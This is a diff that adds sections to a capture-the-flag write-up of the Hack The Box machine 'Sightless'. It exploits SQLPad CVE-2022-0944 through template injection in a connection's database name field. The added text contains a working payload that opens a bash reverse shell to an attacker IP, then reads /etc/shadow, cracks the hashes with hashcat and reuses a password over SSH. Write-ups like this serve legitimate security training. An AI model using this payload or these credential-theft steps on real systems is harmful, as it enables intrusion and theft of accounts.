@@ -20,6 +20,8 @@ dirsearch -u http://sightless.htb/
 Next, I opened Burp Suite and started proxying the traffic through it.
 
 Back on the site, I browsed through the content looking for interesting information. I came across a button labeled "SQLPad" that led to a subdomain: `sqlpad.sightless.htb`. I added this subdomain to my host files for further investigation.
+
+
 ![2024-09-08_09-04](https://github.com/user-attachments/assets/924427a2-bb38-4f0e-a53c-1f40bec07277)
 
  
@@ -107,5 +109,66 @@ Target: http://sightless.htb/
 Task Completed  
 ```
 The /images directory returned a "403 Forbidden" response.
+
+## SQLPad Exploitation
+
+On the `sqlpad.sightless.htb` page, I encountered a web application called SQLPad. According to the documentation, SQLPad is a web app for writing and running SQL queries and visualizing the results. It supports various drivers such as Postgres, MySQL, SQL Server, and many others via ODBC. You can refer to the documentation [here](https://getsqlpad.com/en/connections/).
+
+I looked up known vulnerabilities and found CVE-2022-0944, which describes a critical vulnerability in SQLPad versions up to 6.10.0. This vulnerability is due to an injection flaw classified as CWE-74 (Improper Neutralization of Special Elements used in a Command). The issue arises from SQLPad’s failure to properly neutralize special characters in input that influences command construction, potentially leading to unintended command execution or data manipulation. More details can be found [here](https://vuldb.com/?id.194925).
+
+### Exploitation
+
+I spent some time trying to understand and exploit this vulnerability. After some trial and error with various payloads, several internal server error 500, i finally got ont that worked
+
+
+![2024-09-08_11-33](https://github.com/user-attachments/assets/31ef9a93-42e5-4b1a-b032-588cb82b7ab0)
+
+
+1. **Create a New Connection:**
+   - **Name:** `test`
+   - **Driver:** `mysql`
+   - **Database Name Field:** This is the field where we need to inject the payload.
+
+2. **Payload:**
+   - Use the following payload in the database name field:
+     ```plaintext
+     {{ process.mainModule.require('child_process').exec('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.19/4444 0>&1"') }}
+     ```
+   - Replace `10.10.14.19` with your own IP address.
+
+3. **Setup Listener:**
+   - Set up a listener on your machine to catch the reverse shell.
+
+4. **Test the Connection:**
+   - Click on the "Test" button to trigger the payload.
+
+After setting up the listener and testing the connection, I received a reverse shell on my listener.
+
+
+
+## Initial Discovery
+
+Gained shell access as root and quickly realized the environment was a Docker container. Not what was expected for an easy box.
+
+## Discovering Other Users
+
+Noticed there were other users on the host: `micheal` and `node`. With root access, checked out `/etc/shadow` and saw that `node` didn’t have a password (`!`),.
+
+## Cracking Passwords
+
+Copied the root and `micheal` user hashes from `/etc/shadow`. Used `hashcat` to crack the passwords:
+
+```bash
+hashcat -m 1800 hash ~/tools/rockyou.txt
+```
+A few minutes later, both passwords were cracked. 
+
+
+![2024-09-08_12-03](https://github.com/user-attachments/assets/fe499622-4578-4e18-b5a9-1e87128a3acd)
+
+Tried micheal's password with SSH to 10.10.11.32:
+This worked and got access outside the Docker container. Found the user.txt flag.
+
+
 
 
